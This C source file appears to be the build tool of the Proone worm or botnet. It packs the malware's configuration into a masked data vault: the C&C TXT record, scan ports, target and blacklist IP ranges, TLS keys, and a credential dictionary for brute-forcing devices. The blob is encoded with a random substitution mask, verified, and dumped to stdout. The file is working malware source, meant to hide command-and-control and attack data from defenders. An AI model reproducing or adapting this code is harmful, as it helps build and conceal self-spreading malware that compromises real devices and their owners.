#include "config.h"
#include "dvault.h"
#include "util_rt.h"
#include "imap.h"
#include "resolv.h"
#include "proone_conf/x509.h"
#include "proone_conf/config.h"

#include <stdio.h>
#include <string.h>
#include <assert.h>

#include <unistd.h>
#include <fcntl.h>

#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>

/* Data Vault Format (big endian)
*
* uint8_t mask[256]
* uint16_t offsets[NB_PRNE_DATA_KEY]
* uint8_t data[...]
*/

static struct {
	void *data;
	size_t size;
	prne_dvault_mask_result_t encoded;
	uint16_t pos;
	prne_data_type_t type;
	bool set;
	bool ownership;
} ENTRIES[NB_PRNE_DATA_KEY];

#define add_cstr(key, cstr) {\
	static char STR[] = cstr;\
	ENTRIES[key].data = STR;\
	ENTRIES[key].size = sizeof(STR);\
	ENTRIES[key].type = PRNE_DATA_TYPE_CSTR;\
	ENTRIES[key].set = true;\
}

#define add_bin(key, bin_arr) {\
	static uint8_t ARR[] = bin_arr;\
	ENTRIES[key].data = ARR;\
	ENTRIES[key].size = sizeof(ARR);\
	ENTRIES[key].type = PRNE_DATA_TYPE_BIN;\
	ENTRIES[key].set = true;\
}

static void add_file (const prne_data_key_t key, const char *path) {
	const int fd = open(path, O_RDONLY);
	const off_t size = lseek(fd, 0, SEEK_END);
	ssize_t f_ret;

	prne_assert(fd >= 0 && size >= 0);
	prne_assert(lseek(fd, 0, SEEK_SET) == 0);
	/* FIXME
	* Are empty entries allowed?
	*/
	ENTRIES[key].data = prne_malloc(1, size);
	ENTRIES[key].size = size;
	ENTRIES[key].type = PRNE_DATA_TYPE_BIN;
	ENTRIES[key].set = true;
	ENTRIES[key].ownership = true;

	if (ENTRIES[key].size > 0) {
		prne_assert(ENTRIES[key].data != NULL);
	}

	f_ret = read(fd, ENTRIES[key].data, ENTRIES[key].size);
	prne_assert(f_ret >= 0 && (size_t)f_ret == ENTRIES[key].size);

	close(fd);
}

static mbedtls_entropy_context ent;
static mbedtls_ctr_drbg_context rnd;

static void assert_mbedtls (const bool expr, const int ret, const char *msg) {
	if (!expr) {
		fprintf(stderr, "%s: %d\n", msg, ret);
		abort();
	}
}

static void assert_errno (const bool expr, const char *msg) {
	if (!expr) {
		perror(msg);
		abort();
	}
}

static void assert_dvault (
	const prne_dvault_mask_result_t *ret,
	prne_data_key_t key)
{
	if (ret->result != PRNE_DVAULT_MASK_OK) {
		fprintf(stderr,
			"prne_dvault_mask() %d: %s\n",
			key,
			prne_dvault_mask_result_tostr(ret->result));
		abort();
	}
}

static void assert_plain (const bool expr, const char *msg) {
	if (!expr) {
		fprintf(stderr, "%s\n", msg);
		abort();
	}
}

static void gen_mask (uint8_t *out) {
	prne_imap_t q;

	prne_init_imap(&q);

	for (prne_imap_key_type_t i = 0; i < 256; i += 1) {
		prne_assert(prne_imap_insert(&q, i, 0) != NULL);
	}

	for (uintptr_t i = 0; i < 256; i += 1) {
		size_t n;
		int mbedret;

		mbedret = mbedtls_ctr_drbg_random(
			&rnd,
			(unsigned char*)&n,
			sizeof(size_t));
		prne_massert(
			mbedret == 0,
			"mbedtls_ctr_drbg_random() returned %d",
			mbedret);
		n = n % q.size;

		out[i] = q.tbl[n].key;
		prne_imap_erase(&q, q.tbl[n].key);
	}

	prne_free_imap(&q);
}

static void add_ver_mat () {
	static uint8_t VER_MAT[] = PRNE_VER_MAT;
	static const size_t nb_e = sizeof(VER_MAT) / 16;

	prne_assert(sizeof(VER_MAT) % 16 == 0);
	qsort(VER_MAT, nb_e, 16, prne_cmp_uuid_asc);

	ENTRIES[PRNE_DATA_KEY_VER_MAT].data = VER_MAT;
	ENTRIES[PRNE_DATA_KEY_VER_MAT].size = sizeof(VER_MAT);
	ENTRIES[PRNE_DATA_KEY_VER_MAT].type = PRNE_DATA_TYPE_BIN;
	ENTRIES[PRNE_DATA_KEY_VER_MAT].set = true;
}

int main (const int argc, const char **args) {
	int callret;
	uint8_t mask[256];
	uint_fast16_t pos = 0;
	uint8_t *ptr, *ptr_offsets, *m_out, *m_test;
	const void *ptr_rd;

	if (isatty(STDOUT_FILENO)) {
		fprintf(stderr, "Refusing to print on terminal.\n");
		return 2;
	}
	if (argc < 2) {
		fprintf(stderr, "Usage: %s <cred dict>\n", args[0]);
		return 2;
	}

	mbedtls_entropy_init(&ent);
	mbedtls_ctr_drbg_init(&rnd);
	callret = mbedtls_ctr_drbg_seed(
		&rnd,
		mbedtls_entropy_func,
		&ent,
		NULL,
		0);
	assert_mbedtls(callret == 0, callret, "mbedtls_ctr_drbg_seed()");

	gen_mask(mask);
	pos += 256;

	add_bin(PRNE_DATA_KEY_PROG_VER, PRNE_PROG_VER);
	add_bin(PRNE_DATA_KEY_SHG_SALT, PRNE_SHG_SALT);
	add_bin(PRNE_DATA_KEY_X509_CA_CRT, PRNE_X509_CA_CRT);
	add_bin(PRNE_DATA_KEY_X509_DH, PRNE_X509_DH);
	add_bin(PRNE_DATA_KEY_X509_S_CRT, PRNE_X509_S_CRT);
	add_bin(PRNE_DATA_KEY_X509_S_KEY, PRNE_X509_S_KEY);
	add_bin(PRNE_DATA_KEY_X509_C_CRT, PRNE_X509_C_CRT);
	add_bin(PRNE_DATA_KEY_X509_C_KEY, PRNE_X509_C_KEY);
	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV4, PRNE_RESOLV_NS_POOL_IPV4);
	add_bin(PRNE_DATA_KEY_RESOLV_NS_IPV6, PRNE_RESOLV_NS_POOL_IPV6);
	add_cstr(PRNE_DATA_KEY_CNC_TXT_REC, PRNE_CNC_TXT_REC);
	add_bin(PRNE_DATA_KEY_RCN_PORTS, PRNE_RCN_PORTS);
	add_bin(PRNE_DATA_KEY_RCN_T_IPV4, PRNE_RCN_T_IPV4);
	add_bin(PRNE_DATA_KEY_RCN_BL_IPV4, PRNE_RCN_BL_IPV4);
	add_bin(PRNE_DATA_KEY_RCN_T_IPV6, PRNE_RCN_T_IPV6);
	add_bin(PRNE_DATA_KEY_RCN_BL_IPV6, PRNE_RCN_BL_IPV6);
	add_file(PRNE_DATA_KEY_CRED_DICT, args[1]);
	add_cstr(PRNE_DATA_KEY_EXEC_NAME, PRNE_BNE_EXEC_NAME);
	add_ver_mat();

	pos += NB_PRNE_DATA_KEY * sizeof(uint16_t);

	// Encode
	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
		uint8_t salt;
		const size_t avail = UINT16_MAX - pos;

		assert_plain(ENTRIES[i].set, "Null entry found.");

		callret = mbedtls_ctr_drbg_random(&rnd, &salt, 1);
		assert_mbedtls(callret == 0, callret, "mbedtls_ctr_drbg_random()");
		ENTRIES[i].encoded = prne_dvault_mask(
			ENTRIES[i].type,
			salt,
			mask,
			ENTRIES[i].size,
			ENTRIES[i].data);
		assert_dvault(&ENTRIES[i].encoded, i);

		if (avail < ENTRIES[i].encoded.size) {
			fprintf(stderr, "The output size limit reached!\n");
			return 2;
		}
		ENTRIES[i].pos = pos;
		pos += ENTRIES[i].encoded.size;
	}

	// Write in memory to test
	ptr = m_out = (uint8_t*)prne_malloc(1, pos);
	m_test = (uint8_t*)prne_malloc(1, pos);

	memcpy(ptr, mask, 256);
	ptr += 256;
	ptr_offsets = ptr;

	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
		ptr[0] = (uint8_t)((ENTRIES[i].pos & 0xFF00) >> 8);
		ptr[1] = (uint8_t)((ENTRIES[i].pos & 0x00FF) >> 0);
		ptr += 2;
	}

	prne_dvault_invert_mem(NB_PRNE_DATA_KEY * 2, ptr_offsets, 0, 0, mask);

	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
		memcpy(ptr, ENTRIES[i].encoded.data, ENTRIES[i].encoded.size);
		ptr += ENTRIES[i].encoded.size;
	}

	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
		prne_free_dvault_mask_result(&ENTRIES[i].encoded);
	}

	mbedtls_ctr_drbg_free(&rnd);
	mbedtls_entropy_free(&ent);

	// Test
	memcpy(m_test, m_out, pos);
	for (size_t i = 0; i < 3; i += 1) {
		prne_init_dvault(m_test);

		for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
			size_t size;

			switch (ENTRIES[i].type) {
			case PRNE_DATA_TYPE_BIN:
				ptr_rd = prne_dvault_get_bin(i, &size);
				assert(ptr_rd != NULL);
				assert(size == ENTRIES[i].size);
				assert(memcmp(ptr_rd, ENTRIES[i].data, size) == 0);
				break;
			case PRNE_DATA_TYPE_CSTR:
				ptr_rd = prne_dvault_get_cstr(i, &size);
				assert(ptr_rd != NULL);
				assert(size == strlen((const char*)ptr_rd));
				assert(memcmp(ptr_rd, ENTRIES[i].data, ENTRIES[i].size) == 0);
				break;
			default: abort();
			}
		}

		prne_deinit_dvault();
		assert(memcmp(m_test, m_out, pos) == 0);
	}

	// Dump on stdout
	assert_errno(
		write(STDOUT_FILENO, m_out, pos) == (ssize_t)pos,
		"dumping on stdout");

	for (prne_data_key_t i = 0; i < NB_PRNE_DATA_KEY; i += 1) {
		if (ENTRIES[i].ownership) {
			prne_free(ENTRIES[i].data);
		}
	}

	return 0;
}
